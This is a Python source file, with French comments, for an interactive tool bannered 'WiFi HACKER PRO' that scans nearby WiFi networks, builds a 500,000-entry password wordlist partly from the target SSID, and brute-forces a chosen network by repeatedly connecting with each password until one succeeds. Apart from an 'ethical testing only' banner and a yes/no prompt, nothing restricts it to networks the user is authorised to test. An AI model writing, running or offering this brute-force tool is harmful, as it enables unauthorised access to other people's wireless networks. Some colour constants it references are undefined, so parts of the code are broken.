#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Outil de Test de Sécurité WiFi Éthique v3.0 - ULTRA RAPIDE
Optimisé pour 20+ mots de passe par seconde
"""

import subprocess
import time
import threading
import itertools
import string
import random
import sys
import os
from datetime import datetime
import json
import psutil
import re
import socket
try:
    import pywifi
    from pywifi import const
    import comtypes
    WIFI_AVAILABLE = True
except ImportError:
    WIFI_AVAILABLE = False
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
try:
    import colorama
    from colorama import Fore, Back, Style
    colorama.init()
    COLORS_AVAILABLE = True
except ImportError:
    COLORS_AVAILABLE = False

# Couleurs style Kali Linux - Terminal Theme
if COLORS_AVAILABLE:
    class Colors:
        # Terminal colors
        RED = Fore.LIGHTRED_EX
        GREEN = Fore.LIGHTGREEN_EX
        YELLOW = Fore.LIGHTYELLOW_EX
        BLUE = Fore.LIGHTBLUE_EX
        MAGENTA = Fore.LIGHTMAGENTA_EX
        CYAN = Fore.LIGHTCYAN_EX
        WHITE = Fore.LIGHTWHITE_EX
        BLACK = Fore.BLACK
        
        # Background colors for Kali style
        BG_BLACK = Back.BLACK
        BG_RED = Back.LIGHTRED_EX
        BG_GREEN = Back.LIGHTGREEN_EX
        BG_YELLOW = Back.LIGHTYELLOW_EX
        BG_BLUE = Back.LIGHTBLUE_EX
        BG_GRAY = Back.LIGHTBLACK_EX
        
        # Styles
        BOLD = Style.BRIGHT
        DIM = Style.DIM
        RESET = Style.RESET_ALL
        
        # Kali Linux themed combinations
        @staticmethod
        def header():
            return f"{Colors.BOLD}{Colors.CYAN}"
        
        @staticmethod
        def success():
            return f"{Colors.BOLD}{Colors.GREEN}"
        
        @staticmethod
        def warning():
            return f"{Colors.BOLD}{Colors.YELLOW}"
        
        @staticmethod
        def error():
            return f"{Colors.BOLD}{Colors.RED}"
        
        @staticmethod
        def info():
            return f"{Colors.BOLD}{Colors.BLUE}"
        
        @staticmethod
        def reset():
            return Colors.RESET
        
        @staticmethod
        def endc():
            return Colors.RESET
        
        # Legacy compatibility
        ENDC = RESET
        ERROR = f"{BOLD}{RED}"
        
        @staticmethod
        def kali_prompt():
            return f"{Colors.BOLD}{Colors.GREEN}root@kali{Colors.RESET}{Colors.BOLD}:{Colors.BLUE}/wifi-pentest{Colors.RESET}$ "
        
        @staticmethod
        def terminal_text():
            return f"{Colors.GREEN}"
        
        @staticmethod
        def alert():
            return f"{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}"
        
        @staticmethod
        def clear():
            """Nettoyer l'écran"""
            os.system('cls' if os.name == 'nt' else 'clear')
else:
    class Colors:
        @staticmethod
        def clear():
            os.system('cls' if os.name == 'nt' else 'clear')
        
        @staticmethod
        def reset():
            pass

class WiFiSecurityTester:
    def __init__(self):
        self.interface = None
        self.wordlist = []
        self.start_time = 0
        self.testing = False
        self.password_found = False
        self.found_password = None
        self.attempts = 0
        self.successful_attempts = 0
        
        # Initialisation de l'interface WiFi
        if WIFI_AVAILABLE:
            try:
                wifi = pywifi.PyWiFi()
                if len(wifi.interfaces()) > 0:
                    self.interface = wifi.interfaces()[0]
                else:
                    print("Aucune interface WiFi trouvée")
            except Exception as e:
                print(f"Erreur d'initialisation WiFi: {e}")
    
    def print_header(self, text):
        """Afficher un en-tête stylisé"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}")
        print(f"🔐 {text}")
        print(f"{'='*60}{Colors.ENDC}")
    
    def print_success(self, text):
        """Afficher un message de succès"""
        print(f"{Colors.BOLD}{Colors.GREEN}✅ {text}{Colors.ENDC}")
    
    def print_error(self, text):
        """Afficher un message d'erreur"""
        print(f"{Colors.BOLD}{Colors.RED}❌ {text}{Colors.ENDC}")
    
    def print_warning(self, text):
        """Afficher un avertissement"""
        print(f"{Colors.BOLD}{Colors.YELLOW}⚠️ {text}{Colors.ENDC}")
    
    def print_info(self, text):
        """Afficher un message d'information"""
        print(f"{Colors.BOLD}{Colors.BLUE}ℹ️ {text}{Colors.ENDC}")
    
    def print_banner(self):
        """Afficher la bannière style Kali Linux simple"""
        Colors.clear()
        
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"║ {Colors.BOLD}WiFi HACKER PRO v2.0 - Ultimate WiFi Penetration Tool{Colors.CYAN}           ║")
        print(f"╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Real WiFi Brute Force{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Advanced Password Generation{Colors.RESET}")
        print(f"{Colors.GREEN}[+] Network Discovery & Analysis{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] ETHICAL TESTING ONLY{Colors.RESET}")
        print()
    
    def display_menu(self):
        """Afficher le menu principal - Style Kali Linux simple"""
        
        print(f"{Colors.CYAN}=== WiFi Penetration Testing Tool - Main Menu ==={Colors.RESET}")
        print()
        print(f"{Colors.GREEN}1.{Colors.RESET} Scan WiFi Networks")
        print(f"{Colors.GREEN}2.{Colors.RESET} Generate Wordlist")
        print(f"{Colors.GREEN}3.{Colors.RESET} Manage Wordlists")
        print(f"{Colors.GREEN}4.{Colors.RESET} Brute Force Attack")
        print(f"{Colors.GREEN}5.{Colors.RESET} Simulation Mode")
        print(f"{Colors.GREEN}6.{Colors.RESET} System Statistics")
        print(f"{Colors.GREEN}7.{Colors.RESET} Security Recommendations")
        print(f"{Colors.GREEN}0.{Colors.RESET} Exit")
        print()
        
        # Status
        if self.interface:
            status = "Connected" if self.interface.status() == const.IFACE_CONNECTED else "Disconnected"
            print(f"{Colors.BLUE}Interface: {self.interface.name()} | Status: {status}{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}Simulation mode only{Colors.RESET}")
        
        if self.wordlist:
            print(f"{Colors.BLUE}Wordlist: {len(self.wordlist):,} passwords loaded{Colors.RESET}")
        
        print()
        print(f"{Colors.CYAN}Choice: {Colors.RESET}", end="", flush=True)
    
    def scan_wifi_networks(self):
        """Scanner les réseaux WiFi"""
        self.print_header("🔍 SCAN DES RÉSEAUX WIFI")
        
        if not self.interface:
            self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
            return []
        
        try:
            self.interface.scan()
            time.sleep(2)  # Attendre la fin du scan
            
            networks = self.interface.scan_results()
            if not networks:
                self.print_warning("Aucun réseau trouvé")
                return []
            
            self.print_success(f"{len(networks)} réseaux trouvés")
            
            # Affichage des réseaux
            print(f"\n{Colors.BOLD}{'SSID':<20} {'BSSID':<18} {'Signal':<8} {'Sécurité':<15}{Colors.ENDC}")
            print("-" * 70)
            
            for network in networks:
                ssid = network.ssid or "Caché"
                bssid = network.bssid
                signal = f"{network.signal} dBm"
                
                # Détection du type de sécurité
                security = "Ouvert"
                if network.akm:
                    if const.AKM_TYPE_WPA in network.akm:
                        security = "WPA"
                    elif const.AKM_TYPE_WPA2 in network.akm:
                        security = "WPA2"
                    elif const.AKM_TYPE_WPA2PSK in network.akm:
                        security = "WPA2-PSK"
                    elif const.AKM_TYPE_WPAPSK in network.akm:
                        security = "WPA-PSK"
                
                print(f"{ssid:<20} {bssid:<18} {signal:<8} {security:<15}")
            
            return networks
            
        except Exception as e:
            self.print_error(f"Erreur lors du scan: {e}")
            return []
    
    def generate_comprehensive_wordlist(self, target_ssid=""):
        """Générer une wordlist complète ultra-optimisée"""
        self.print_header("📝 GÉNÉRATION WORDLIST ULTIME")
        
        size = 500000  # 500k mots de passe ultra-optimisés
        wordlist = set()
        
        self.print_info(f"Génération de {size:,} mots de passe ultra-optimisés...")
        
        # 1. Mots de passe courants ultra-optimisés
        self.print_info("[*] Génération mots de passe courants...")
        common_passwords = [
            "password", "12345678", "qwerty", "abc123", "letmein",
            "admin", "welcome", "monkey", "dragon", "master",
            "sunshine", "princess", "football", "iloveyou", "123123",
            "123456789", "qwertyuiop", "password123", "admin123", "1234567890"
        ]
        
        for pwd in common_passwords:
            if len(pwd) >= 8:
                wordlist.add(pwd)
                wordlist.add(pwd.upper())
                wordlist.add(pwd.capitalize())
                wordlist.add(pwd + "123")
                wordlist.add(pwd + "2024")
        
        # 2. Patterns numériques ultra-optimisés
        self.print_info("[*] Génération patterns numériques...")
        for i in range(1000000):
            if len(wordlist) >= size * 0.3:  # 30% numériques
                break
            pwd = str(i).zfill(8)
            wordlist.add(pwd)
        
        # 3. Patterns alphanumériques ultra-optimisés
        self.print_info("[*] Génération patterns alphanumériques...")
        chars = string.ascii_lowercase + string.digits
        for length in range(8, 12):
            if len(wordlist) >= size * 0.6:  # 60% alphanumériques
                break
            for _ in range(5000):
                if len(wordlist) >= size * 0.6:
                    break
                pwd = ''.join(random.choice(chars) for _ in range(length))
                wordlist.add(pwd)
                wordlist.add(pwd.upper())
                wordlist.add(pwd.capitalize())
        
        # 4. Patterns basés sur SSID ultra-optimisés
        if target_ssid:
            self.print_info(f"[*] Génération patterns basés sur: {target_ssid}")
            ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', target_ssid.lower())
            
            for i in range(10000):
                if len(wordlist) >= size * 0.8:  # 80% basés sur SSID
                    break
                combined = f"{ssid_clean}{i}"
                if len(combined) >= 8:
                    wordlist.add(combined)
                    wordlist.add(combined.upper())
        
        # 5. Patterns complexes ultra-optimisés
        self.print_info("[*] Génération patterns complexes...")
        special_chars = "!@#$%^&*"
        complex_chars = string.ascii_letters + string.digits + special_chars
        
        for length in range(8, 16):
            if len(wordlist) >= size:
                break
            for _ in range(2000):
                if len(wordlist) >= size:
                    break
                pwd = ''.join(random.choice(complex_chars) for _ in range(length))
                wordlist.add(pwd)
        
        self.wordlist = list(wordlist)
        random.shuffle(self.wordlist)  # Mélanger pour éviter les patterns
        
        self.print_success(f"Wordlist générée: {len(self.wordlist):,} mots de passe")
        return self.wordlist
    
    def connect_to_wifi(self, ssid, password, timeout=0.5):
        """Connexion WiFi ultra-rapide"""
        if not self.interface:
            return False, "Interface WiFi non disponible"
        
        try:
            self.interface.disconnect()
            time.sleep(0.05)  # Ultra-rapide: 50ms
            
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            self.interface.remove_all_network_profiles()
            temp_profile = self.interface.add_network_profile(profile)
            self.interface.connect(temp_profile)
            
            # Timeout ultra-rapide: 0.5s pour 20+ pwd/sec
            for i in range(timeout * 20):  # 20 vérifications par seconde
                if self.interface.status() == const.IFACE_CONNECTED:
                    return True, "Connexion réussie"
                time.sleep(0.05)  # 50ms au lieu de 200ms
            
            self.interface.disconnect()
            return False, "Timeout de connexion"
            
        except Exception as e:
            return False, f"Erreur de connexion: {str(e)}"
    
    def brute_force_wifi_real(self, target_ssid, max_attempts=None):
        """Brute force ultra-rapide - 20+ mots de passe/seconde"""
        if not self.interface:
            self.print_warning("Mode simulation uniquement - bibliothèques WiFi non disponibles")
            return self.simulate_brute_force(target_ssid, max_attempts)
        
        self.print_header(f"🚨 BRUTE FORCE ULTRA-RAPIDE sur: {target_ssid}")
        self.print_warning("TEST ÉTHIQUE UNIQUEMENT - Réseau autorisé requis")
        self.print_info("⚡ VITESSE: 20+ mots de passe/seconde")
        self.print_info("🔧 TIMEOUT: 0.5s par tentative")
        
        if input("Confirmer le test de brute force (o/N): ").lower() != 'o':
            self.print_error("Test annulé")
            return None
        
        if not self.wordlist:
            self.generate_comprehensive_wordlist(target_ssid)
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        self.start_time = time.time()
        self.testing = True
        self.password_found = False
        self.attempts = 0
        
        # Barre de progression ultra-rapide
        if TQDM_AVAILABLE:
            progress_bar = tqdm(range(max_attempts), desc="⚡ Brute Force Ultra-Rapide", unit="pwd", 
                               bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}]")
        else:
            progress_bar = range(max_attempts)
        
        try:
            for i in progress_bar:
                if not self.testing:
                    break
                
                password = self.wordlist[i]
                self.attempts += 1
                
                # Optimisation extrême: timeout de 0.5s pour 20+ pwd/sec
                success, message = self.connect_to_wifi(target_ssid, password, timeout=0.5)
                
                if success:
                    self.password_found = True
                    self.found_password = password
                    self.successful_attempts = self.attempts
                    
                    elapsed_time = time.time() - self.start_time
                    speed = self.attempts / elapsed_time
                    
                    print("\n" + "="*60)
                    self.print_success("🎉 MOT DE PASSE TROUVÉ!")
                    print(f"📡 SSID: {target_ssid}")
                    self.print_success(f"🔑 Mot de passe: {password}")
                    print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
                    print(f"🔢 Tentatives: {self.attempts}")
                    print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
                    self.print_info("[+] CONNEXION AUTOMATIQUE AU WIFI RÉUSSIE")
                    print("="*60)
                    break
                
                # Optimisation: affichage toutes les 100 tentatives pour moins de ralentissement
                if self.attempts % 100 == 0:
                    elapsed_time = time.time() - self.start_time
                    speed = self.attempts / elapsed_time
                    eta = (max_attempts - self.attempts) / speed if speed > 0 else 0
                    print(f"\r⚡ Vitesse: {speed:.1f} pwd/sec | Progression: {self.attempts}/{max_attempts} | ETA: {eta:.1f}s", end="", flush=True)
                
                # Optimisation: aucun delay pour vitesse maximale
                # time.sleep(0)  # Supprimé pour vitesse maximale
                
        except KeyboardInterrupt:
            self.print_warning("\nTest interrompu par l'utilisateur")
            self.testing = False
        except Exception as e:
            self.print_error(f"Erreur lors du test: {e}")
        
        # Génération du rapport
        elapsed_time = time.time() - self.start_time
        
        report = {
            'target_ssid': target_ssid,
            'test_date': datetime.now().isoformat(),
            'brute_force_mode': True,
            'passwords_tested': self.attempts,
            'password_found': self.password_found,
            'found_password': self.found_password if self.password_found else None,
            'elapsed_time': elapsed_time,
            'attempts_per_second': self.attempts / elapsed_time if elapsed_time > 0 else 0,
            'security_resistance': {
                'time_to_crack': elapsed_time if self.password_found else f"> {elapsed_time:.2f}s",
                'attempts_needed': self.attempts if self.password_found else f"> {self.attempts}",
                'resistance_score': min(100, max(0, 100 - (self.attempts / 100)))
            }
        }
        
        self.save_brute_force_report(report)
        return report
    
    def simulate_brute_force(self, target_ssid, max_attempts=1000):
        """Simulation de brute force ultra-rapide"""
        self.print_header(f"🎮 SIMULATION BRUTE FORCE sur: {target_ssid}")
        
        if not self.wordlist:
            self.generate_comprehensive_wordlist(target_ssid)
        
        if max_attempts is None:
            max_attempts = len(self.wordlist)
        else:
            max_attempts = min(max_attempts, len(self.wordlist))
        
        self.start_time = time.time()
        self.attempts = 0
        
        # Simulation ultra-rapide
        if TQDM_AVAILABLE:
            progress_bar = tqdm(range(max_attempts), desc="🎮 Simulation Ultra-Rapide", unit="pwd")
        else:
            progress_bar = range(max_attempts)
        
        for i in progress_bar:
            password = self.wordlist[i]
            self.attempts += 1
            
            # Simulation: 1 chance sur 1000 de trouver le mot de passe
            if random.randint(1, 1000) == 1:
                elapsed_time = time.time() - self.start_time
                speed = self.attempts / elapsed_time
                
                print("\n" + "="*50)
                self.print_success("🎉 MOT DE PASSE TROUVÉ (SIMULATION)!")
                print(f"📡 SSID: {target_ssid}")
                self.print_success(f"🔑 Mot de passe: {password}")
                print(f"⏱️ Temps: {elapsed_time:.2f} secondes")
                print(f"🔢 Tentatives: {self.attempts}")
                print(f"⚡ Vitesse: {speed:.2f} pwd/sec")
                print("="*50)
                break
            
            # Simulation ultra-rapide: pas de delay
            # time.sleep(0)  # Supprimé pour vitesse maximale
        
        elapsed_time = time.time() - self.start_time
        speed = self.attempts / elapsed_time
        
        print(f"\n{Colors.CYAN}📊 Statistiques de simulation:")
        print(f"⏱️ Temps total: {elapsed_time:.2f} secondes")
        print(f"🔢 Tentatives: {self.attempts}")
        print(f"⚡ Vitesse: {speed:.2f} pwd/sec{Colors.ENDC}")
        
        return {
            'target_ssid': target_ssid,
            'simulation_mode': True,
            'attempts': self.attempts,
            'elapsed_time': elapsed_time,
            'speed': speed
        }
    
    def save_brute_force_report(self, report):
        """Sauvegarder le rapport de brute force"""
        try:
            if not os.path.exists('reports'):
                os.makedirs('reports')
            
            filename = f"reports/brute_force_report_{report['target_ssid']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            
            self.print_success(f"Rapport sauvegardé: {filename}")
            
        except Exception as e:
            self.print_error(f"Erreur lors de la sauvegarde du rapport: {e}")
    
    def display_system_stats(self):
        """Afficher les statistiques système ultra-rapides"""
        Colors.clear()
        
        print(f"{Colors.BG_MAGENTA}{Colors.WHITE}")
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                        📊 STATISTIQUES SYSTÈME ULTRA-RAPIDES                      ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.ENDC}")
        
        # CPU avec barre de progression
        cpu_percent = psutil.cpu_percent(interval=1)
        cpu_bar = self.create_progress_bar(cpu_percent, 50, "CPU")
        print(f"{Colors.CYAN}💻 {cpu_bar} {cpu_percent}%{Colors.ENDC}")
        
        # Mémoire avec barre de progression
        memory = psutil.virtual_memory()
        mem_bar = self.create_progress_bar(memory.percent, 50, "RAM")
        print(f"{Colors.GREEN}🧠 {mem_bar} {memory.percent}% ({memory.used/1024/1024/1024:.1f}GB/{memory.total/1024/1024/1024:.1f}GB){Colors.ENDC}")
        
        # Wordlist
        if self.wordlist:
            print(f"{Colors.MAGENTA}📋 Wordlist: {len(self.wordlist):,} mots de passe{Colors.ENDC}")
            avg_length = sum(len(pwd) for pwd in self.wordlist) / len(self.wordlist)
            print(f"{Colors.MAGENTA}📏 Longueur moyenne: {avg_length:.1f} caractères{Colors.ENDC}")
            
            # Temps estimé
            estimated_time = len(self.wordlist) * 0.05  # 20 pwd/sec
            hours = estimated_time / 3600
            if hours > 24:
                days = hours / 24
                print(f"{Colors.MAGENTA}⏱️ Temps estimé: {days:.1f} jours{Colors.ENDC}")
            else:
                print(f"{Colors.MAGENTA}⏱️ Temps estimé: {hours:.1f} heures{Colors.ENDC}")
        else:
            print(f"{Colors.GRAY}📋 Aucune wordlist chargée{Colors.ENDC}")
        
        # Interface WiFi
        if self.interface:
            status = "🟢 CONNECTÉ" if self.interface.status() == const.IFACE_CONNECTED else "🔴 DÉCONNECTÉ"
            interface_name = self.interface.name() or "Inconnue"
            print(f"{Colors.CYAN}📡 Interface: {interface_name} | {status}{Colors.ENDC}")
        
        print(f"\n{Colors.BG_BLUE}{Colors.WHITE} ⚡ OPTIMISATION ULTRA-RAPIDE ACTIVE - 20+ pwd/sec {Colors.ENDC}")
    
    def create_progress_bar(self, percentage, width, label):
        """Créer une barre de progression colorée"""
        filled = int(width * percentage / 100)
        bar = ""
        
        for i in range(width):
            if i < filled:
                if percentage < 30:
                    bar += "█"
                elif percentage < 70:
                    bar += "▓"
                else:
                    bar += "▒"
            else:
                bar += "░"
        
        return f"{label}: [{bar}]"
    
    def display_security_recommendations(self):
        """Afficher les recommandations de sécurité"""
        self.print_header("🛡️ RECOMMANDATIONS DE SÉCURITÉ")
        
        recommendations = [
            "🔑 Utilisez des mots de passe d'au moins 12 caractères",
            "🔤 Combinez lettres, chiffres et caractères spéciaux",
            "🔄 Changez régulièrement vos mots de passe WiFi",
            "🚫 Évitez les informations personnelles dans les mots de passe",
            "📱 Activez WPA3 si disponible",
            "🔥 Désactivez le WPS (Wi-Fi Protected Setup)",
            "📊 Surveillez les connexions suspectes",
            "🛡️ Utilisez un VPN pour les connexions publiques",
            "🔄 Mettez à jour régulièrement votre routeur",
            "🔒 Séparez le réseau invité du réseau principal"
        ]
        
        for rec in recommendations:
            print(f"  {rec}")
        
        print(f"\n{Colors.WARNING}⚠️ Ces recommandations sont pour protéger VOS propres réseaux{Colors.ENDC}")
    
    def run(self):
        """Point d'entrée principal ultra-rapide"""
        self.print_banner()
        
        while True:
            self.display_menu()
            
            try:
                choice = input(f"\n{Colors.BOLD}🎯 Choisissez une option (0-7): {Colors.ENDC}")
                
                if choice == '1':
                    self.scan_wifi_networks()
                elif choice == '2':
                    ssid = input("SSID du réseau cible (optionnel): ")
                    self.generate_comprehensive_wordlist(ssid)
                elif choice == '3':
                    self.manage_wordlists()
                elif choice == '4':
                    ssid = input("SSID du réseau à tester: ")
                    self.brute_force_wifi_real(ssid)
                elif choice == '5':
                    ssid = input("SSID du réseau à simuler: ")
                    self.simulate_brute_force(ssid)
                elif choice == '6':
                    self.display_system_stats()
                elif choice == '7':
                    self.display_security_recommendations()
                elif choice == '0':
                    self.print_success("Au revoir! 🔐")
                    break
                else:
                    self.print_error("Option invalide!")
                
                input(f"\n{Colors.DIM}Appuyez sur Entrée pour continuer...{Colors.ENDC}")
                
            except KeyboardInterrupt:
                self.print_warning("\nInterruption détectée")
                break
            except Exception as e:
                self.print_error(f"Erreur: {e}")
    
    def manage_wordlists(self):
        """Gérer les wordlists personnalisées"""
        self.print_header("📂 GESTION WORDLISTS")
        
        while True:
            print(f"\n{Colors.CYAN}📋 Menu Wordlists:")
            print("1. 📂 Charger wordlist personnalisée")
            print("2. 📋 Lister les wordlists disponibles")
            print("3. 💾 Sauvegarder wordlist actuelle")
            print("0. 🔙 Retour au menu principal{Colors.ENDC}")
            
            choice = input("\nChoix: ")
            
            if choice == '1':
                self.load_custom_wordlist()
            elif choice == '2':
                self.list_available_wordlists()
            elif choice == '3':
                self.save_custom_wordlist()
            elif choice == '0':
                break
            else:
                self.print_error("Option invalide!")
    
    def load_custom_wordlist(self):
        """Charger une wordlist personnalisée"""
        file_path = input("Chemin du fichier wordlist: ")
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            self.wordlist = passwords
            self.print_success(f"Wordlist chargée: {len(passwords)} mots de passe")
            
        except FileNotFoundError:
            self.print_error("Fichier non trouvé!")
        except Exception as e:
            self.print_error(f"Erreur lors du chargement: {e}")
    
    def save_custom_wordlist(self):
        """Sauvegarder la wordlist actuelle"""
        if not self.wordlist:
            self.print_warning("Aucune wordlist à sauvegarder!")
            return
        
        filename = input("Nom du fichier (sans extension): ")
        
        try:
            if not os.path.exists('wordlists'):
                os.makedirs('wordlists')
            
            filepath = f"wordlists/{filename}.txt"
            with open(filepath, 'w', encoding='utf-8') as f:
                for password in self.wordlist:
                    f.write(password + '\n')
            
            self.print_success(f"Wordlist sauvegardée: {filepath}")
            
        except Exception as e:
            self.print_error(f"Erreur lors de la sauvegarde: {e}")
    
    def list_available_wordlists(self):
        """Lister les wordlists disponibles"""
        wordlists_dir = 'wordlists'
        
        if not os.path.exists(wordlists_dir):
            self.print_warning("Dossier wordlists non trouvé!")
            return
        
        files = [f for f in os.listdir(wordlists_dir) if f.endswith('.txt')]
        
        if not files:
            self.print_warning("Aucune wordlist trouvée!")
            return
        
        print(f"\n{Colors.GREEN}📋 Wordlists disponibles:{Colors.ENDC}")
        for file in files:
            filepath = os.path.join(wordlists_dir, file)
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    count = sum(1 for line in f if line.strip())
                print(f"  📄 {file} ({count:,} mots de passe)")
            except:
                print(f"  📄 {file} (erreur de lecture)")

def main():
    """Fonction principale"""
    try:
        tester = WiFiSecurityTester()
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Programme interrompu{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.ERROR}Erreur fatale: {e}{Colors.ENDC}")

if __name__ == "__main__":
    main()
